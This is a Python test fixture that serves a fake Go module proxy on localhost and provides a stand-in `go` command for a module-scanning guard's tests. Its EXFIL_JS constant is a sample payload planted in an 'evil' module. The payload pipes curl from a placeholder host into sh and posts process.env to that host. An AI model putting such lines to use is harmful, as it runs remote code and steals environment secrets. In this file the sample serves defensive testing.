"""A fake Go module proxy on 127.0.0.1, and a fake `go` command, for the guard's Go tests. Nothing here is a test.

The proxy answers the protocol of `go help goproxy` for modules built in memory; every hostile payload is inert text (hosts are
192.0.2.x). The fake `go` stands in for the real one where a test needs to say exactly what the tool does (fetch these paths
from its GOPROXY, write that file, leave this in the module cache)."""

import datetime
import hashlib
import http.server
import io
import json
import os
import re
import socketserver
import stat
import sys
import threading
import urllib.parse
import zipfile

NOW = datetime.datetime.now(datetime.timezone.utc)
OLD = NOW - datetime.timedelta(days=30)
FRESH = NOW - datetime.timedelta(hours=1)

#: A JavaScript file that reads the environment and sends it away: what the registry scanner calls SUSPICIOUS in any archive
EXFIL_JS = ("require('child_process').exec('curl http://192.0.2.9/x | sh');\n"
            "fetch('http://192.0.2.9/up', {method: 'POST', body: JSON.stringify(process.env)});\n")
CLEAN_GO = "package {name}\n\nfunc {func}() int {{ return {n} }}\n"


def go_time(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def encode(text):
    """The proxy's case encoding: `!` and the lower-case letter for each capital."""
    return "".join("!" + c.lower() if "A" <= c <= "Z" else c for c in text)


def decode(text):
    return re.sub(r"!([a-z])", lambda m: m.group(1).upper(), text)


def version_key(version):
    nums = re.match(r"v(\d+)\.(\d+)\.(\d+)", version)
    return tuple(int(n) for n in nums.groups()) if nums else (0, 0, 0)


def module_zip(module, version, files, requires=()):
    """-> (the zip bytes of a module, its go.mod text): every member under `module@version/`, as go builds one."""
    gomod = f"module {module}\n\ngo 1.21\n"
    if requires:
        gomod += "\nrequire (\n" + "".join(f"\t{m} {v}\n" for m, v in requires) + ")\n"
    body = {"go.mod": gomod}
    body.update(files)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, text in sorted(body.items()):
            zf.writestr(f"{module}@{version}/{name}", text)
    return buf.getvalue(), gomod


class GoProxy:
    """A module proxy: add(module, version, files, requires, published). `requests` is (user-agent, path) of every request and
    `authorizations` (path, Authorization header). With `auth` (a whole Authorization header value) it answers 401 to a request
    without it; with `redirect` it sends zips to another path of its own (as the real proxy sends them to its storage); `fail`
    maps a path suffix to (status, body) for a request that should fail; `sumdb` is the bodies of /sumdb/ paths."""

    def __init__(self, auth=None, redirect=False):
        self.modules = {}
        self.requests = []
        self.authorizations = []
        self.auth = auth
        self.redirect = redirect
        self.fail = {}
        self.sumdb = {}
        self.blobs = {}
        proxy = self

        class Handler(http.server.BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *args):
                pass

            def _send(self, code, body, ctype="text/plain", headers=()):
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                for k, v in headers:
                    self.send_header(k, v)
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self):
                path = urllib.parse.unquote(urllib.parse.urlsplit(self.path).path)
                proxy.requests.append((self.headers.get("User-Agent", ""), path))
                proxy.authorizations.append((path, self.headers.get("Authorization")))
                if proxy.auth is not None and self.headers.get("Authorization") != proxy.auth:
                    self._send(401, b"authentication required\n", headers=[("WWW-Authenticate", 'Basic realm="proxy"')])
                    return
                for suffix, (code, body) in proxy.fail.items():
                    if path.endswith(suffix):
                        self._send(code, body)
                        return
                code, body, ctype, headers = proxy.answer(path)
                self._send(code, body, ctype, headers)

        class Server(socketserver.ThreadingMixIn, http.server.HTTPServer):
            daemon_threads = True

        self.server = Server(("127.0.0.1", 0), Handler)
        self.url = f"http://127.0.0.1:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True).start()

    def add(self, module, version, files=None, requires=(), published=OLD):
        data, gomod = module_zip(module, version, files if files is not None else
                                 {"m.go": CLEAN_GO.format(name=module.rsplit("/", 1)[-1], func="F", n=1)}, requires)
        self.modules.setdefault(module, {})[version] = {"zip": data, "mod": gomod, "time": published}
        return data

    def info(self, module, version):
        return json.dumps({"Version": version, "Time": go_time(self.modules[module][version]["time"])}).encode()

    def answer(self, path):
        text = "text/plain"
        if path.startswith("/blob/"):
            data = self.blobs.get(path)
            return (200, data, "application/zip", ()) if data is not None else (404, b"not found\n", text, ())
        if path.startswith("/sumdb/"):
            body = self.sumdb.get(path)
            return (200, body, text, ()) if body is not None else (404, b"not found\n", text, ())
        module_part, at, tail = path.lstrip("/").partition("/@")
        module = decode(module_part)
        versions = self.modules.get(module)
        if not at or versions is None:
            return 404, b"not found\n", text, ()
        if tail == "v/list":
            return 200, "".join(v + "\n" for v in sorted(versions, key=version_key)).encode(), text, ()
        if tail == "latest":
            return 200, self.info(module, max(versions, key=version_key)), "application/json", ()
        name = decode(tail[2:]) if tail.startswith("v/") else ""
        for ext in (".info", ".mod", ".zip"):
            if name.endswith(ext):
                version = name[:-len(ext)]
                if version not in versions:
                    return 404, b"not found\n", text, ()
                if ext == ".info":
                    return 200, self.info(module, version), "application/json", ()
                if ext == ".mod":
                    return 200, versions[version]["mod"].encode(), text, ()
                if self.redirect:
                    blob = f"/blob/{hashlib.sha256(versions[version]['zip']).hexdigest()}.zip"
                    self.blobs[blob] = versions[version]["zip"]
                    return 302, b"", text, [("Location", blob)]
                return 200, versions[version]["zip"], "application/zip", ()
        return 404, b"not found\n", text, ()

    def paths(self, suffix=""):
        """The paths asked for (those ending in `suffix`), in order."""
        return [p for _, p in self.requests if p.endswith(suffix)]

    def close(self):
        self.server.shutdown()
        self.server.server_close()


def default_modules(proxy):
    """The modules the Go guard tests use: a clean one that needs another, a hostile one, a parent that needs the hostile one,
    and modules with a new release."""
    proxy.add("example.test/good", "v1.0.0", requires=[("example.test/leaf", "v1.0.0")],
              files={"m.go": 'package good\n\nimport "example.test/leaf"\n\nfunc F() int { return leaf.F() }\n'})
    proxy.add("example.test/leaf", "v1.0.0")
    proxy.add("example.test/evil", "v1.0.0", files={"e.go": "package evil\n", "web/x.js": EXFIL_JS})
    proxy.add("example.test/parent", "v1.0.0", requires=[("example.test/evil", "v1.0.0")],
              files={"p.go": 'package parent\n\nimport "example.test/evil"\n\nvar _ = evil.E\n'})
    proxy.add("example.test/mixed", "v1.0.0")
    proxy.add("example.test/mixed", "v1.1.0", published=FRESH)
    proxy.add("example.test/onlynew", "v1.0.0", published=FRESH)
    proxy.add("example.test/BigCase", "v1.0.0")


FAKE_GO = r'''#!@@PYTHON@@
"""A stand-in for the go command. FAKE_GO_ENV: the JSON `go env -json` answers from (null: it fails); FAKE_GO_PLAN: what any other command
does, as a JSON list of steps; FAKE_GO_ENV_LOG: where it writes the folder each `go env` ran in; FAKE_GO_LOG: where it writes {"argv", "GOPROXY", "GOMODCACHE", "GOWORK", "GOTOOLCHAIN", "cwd"}, one line per run.
`go mod download -json` (the guard's list of the modules a command uses) is FAKE_GO_LISTING's: {"steps": [...], "records": [the
JSON objects it prints], "exit": its exit code, "stderr": what it says}; it is logged to FAKE_GO_LIST_LOG, not FAKE_GO_LOG."""
import base64, json, os, sys, urllib.request, urllib.error

args = sys.argv[1:]
if args[:2] == ["env", "-json"]:
    env = json.loads(os.environ.get("FAKE_GO_ENV", "{}"))
    if os.environ.get("FAKE_GO_ENV_LOG"):              # where `go env` was asked (the folder it ran in)
        with open(os.environ["FAKE_GO_ENV_LOG"], "a", encoding="utf-8") as f:
            f.write(os.getcwd() + "\n")
    if env is None:                                    # a go that cannot say its settings
        print("go: broken", file=sys.stderr)
        sys.exit(1)
    values = {k: env.get(k, "") for k in args[2:]}
    if "GONOPROXY" in values and "GONOPROXY" not in env:   # (go's default: GOPRIVATE)
        values["GONOPROXY"] = env.get("GOPRIVATE", "")
    print(json.dumps(values))
    sys.exit(0)
listing = None
if args[:2] == ["mod", "download"] and "-json" in args:
    listing = json.loads(os.environ.get("FAKE_GO_LISTING") or "{}")
    log, steps = os.environ.get("FAKE_GO_LIST_LOG"), listing.get("steps", [])
else:
    log, steps = os.environ.get("FAKE_GO_LOG"), json.loads(os.environ.get("FAKE_GO_PLAN", "[]"))
if log:
    with open(log, "a", encoding="utf-8") as f:
        f.write(json.dumps({"argv": args, "GOPROXY": os.environ.get("GOPROXY"), "GOMODCACHE": os.environ.get("GOMODCACHE"),
                            "GOWORK": os.environ.get("GOWORK"), "GOTOOLCHAIN": os.environ.get("GOTOOLCHAIN"),
                            "cwd": os.getcwd()}) + "\n")
code = 0
opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
for step in steps:
    kind = step[0]
    if kind == "get":                                  # fetch a path of GOPROXY; write what came to a file, or the status
        try:
            with opener.open(os.environ["GOPROXY"] + step[1]) as r:
                body, status = r.read(), r.status
        except urllib.error.HTTPError as exc:
            body, status = exc.read(), exc.code
        if len(step) > 2:
            os.makedirs(os.path.dirname(step[2]) or ".", exist_ok=True)
            with open(step[2], "wb") as f:
                f.write(body if status == 200 else str(status).encode())
        if status != 200:
            print("go: reading " + step[1] + ": " + str(status), file=sys.stderr)
            code = 1
    elif kind == "write":                              # write a file
        os.makedirs(os.path.dirname(step[1]) or ".", exist_ok=True)
        with open(step[1], "w", encoding="utf-8") as f:
            f.write(step[2])
    elif kind == "writeb64":                           # write a file of bytes (base64)
        os.makedirs(os.path.dirname(step[1]) or ".", exist_ok=True)
        with open(step[1], "wb") as f:
            f.write(base64.b64decode(step[2]))
    elif kind == "cachezip":                           # put a module's zip (base64) in GOMODCACHE, as go leaves one it fetched
        enc = lambda t: "".join("!" + c.lower() if "A" <= c <= "Z" else c for c in t)
        path = os.path.join(os.environ["GOMODCACHE"], "cache", "download", enc(step[1]), "@v", enc(step[2]) + ".zip")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as f:
            f.write(base64.b64decode(step[3]))
    elif kind == "append":
        with open(step[1], "a", encoding="utf-8") as f:
            f.write(step[2])
    elif kind == "copy":                               # copy a file of the folder go runs in (step[1]) to another (step[2])
        with open(step[1], "rb") as src, open(step[2], "wb") as dst:
            dst.write(src.read())
    elif kind == "say":                                # print on the standard output
        print(step[1])
    elif kind == "exit":
        code = step[1]
if listing is not None:
    for record in listing.get("records", []):
        print(json.dumps(record, indent="\t"))
    if listing.get("stderr"):
        print(listing["stderr"], file=sys.stderr)
    code = listing.get("exit", code)
sys.exit(code)
'''


def install_fake_go(folder):
    """Put a fake `go` in `folder` (and so on PATH, when it is put there) -> its path."""
    path = os.path.join(folder, "go")
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(FAKE_GO.replace("@@PYTHON@@", sys.executable))
    os.chmod(path, os.stat(path).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    return path
